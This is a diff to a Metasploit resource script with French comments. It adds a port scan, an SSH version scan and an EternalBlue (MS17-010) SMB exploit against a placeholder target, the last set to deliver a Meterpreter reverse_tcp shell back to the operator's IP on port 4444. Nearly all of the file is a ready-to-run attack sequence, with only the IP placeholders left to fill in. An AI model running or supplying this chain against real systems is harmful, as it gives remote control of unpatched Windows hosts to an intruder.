@@ -1,12 +1,23 @@
 spool /app/results/spool.txt
 
+# Scan de ports communs
 use auxiliary/scanner/portscan/tcp
 set RHOSTS __TARGET_IP__
+set PORTS 1-1000
 set THREADS 10
 run
 
+# Scan de vulnérabilités SSH
 use auxiliary/scanner/ssh/ssh_version
 set RHOSTS __TARGET_IP__
 run
+
+# Exemple d'exploit SMB EternalBlue (juste un exemple, adapter selon cible)
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST __TARGET_IP__
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <ton_ip_locale>
+set LPORT 4444
+exploit -j -z
 
 exit
